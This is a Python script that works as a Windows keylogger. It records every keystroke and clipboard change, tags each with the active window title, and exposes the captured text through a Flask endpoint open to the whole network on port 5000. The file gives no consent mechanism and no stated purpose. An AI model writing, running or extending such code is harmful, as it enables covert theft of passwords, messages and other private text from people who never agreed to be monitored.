import time
import threading
from flask import Flask, jsonify
from pynput import keyboard
import win32gui
import pyperclip

app = Flask(__name__)

# Shared memory
logs = []  # Each log entry: (timestamp, app_name, type, text)
current_text = ""
last_clipboard = ""

def get_active_window_title():
    """Get the currently active window's title."""
    try:
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        return title
    except Exception:
        return "Unknown App"

def add_log(event_type, text):
    """Add new event to logs."""
    logs.insert(0, {
        "time": time.strftime("%H:%M:%S"),
        "app": get_active_window_title(),
        "type": event_type,
        "text": text.strip()
    })
    # Immediately print new event
    prefix = "⌨️" if event_type == "typed" else "🧠"
    print("\033c", end="")  # clear terminal
    print("=== LIVE TEXT LOGGER ===\n")
    print(f"[{time.strftime('%H:%M:%S')}]  {get_active_window_title()}  {prefix} ({event_type})")
    print(f"  → {text}\n")
    print("Live view: http://localhost:5000/live")

# Keyboard listener
def on_press(key):
    global current_text
    try:
        char = key.char if hasattr(key, 'char') else None
        if char:
            current_text += char
        elif key == keyboard.Key.space:
            current_text += " "
        elif key == keyboard.Key.enter:
            if current_text.strip():
                add_log("typed", current_text)
            current_text = ""
        elif key == keyboard.Key.backspace:
            current_text = current_text[:-1]
    except Exception as e:
        print("Error:", e)

def start_keyboard_listener():
    from pynput import keyboard
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Clipboard watcher
def clipboard_watcher():
    global last_clipboard
    while True:
        try:
            text = pyperclip.paste()
            if text != last_clipboard and isinstance(text, str) and len(text.strip()) > 0:
                last_clipboard = text
                add_log("selected/copied", text)
        except Exception:
            pass
        time.sleep(0.5)

# Flask endpoint
@app.route("/live")
def live_view():
    return jsonify({
        "latest": logs[:10],
        "total": len(logs)
    })

def run_flask():
    app.run(host="0.0.0.0", port=5000, debug=False)

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    threading.Thread(target=clipboard_watcher, daemon=True).start()
    start_keyboard_listener()
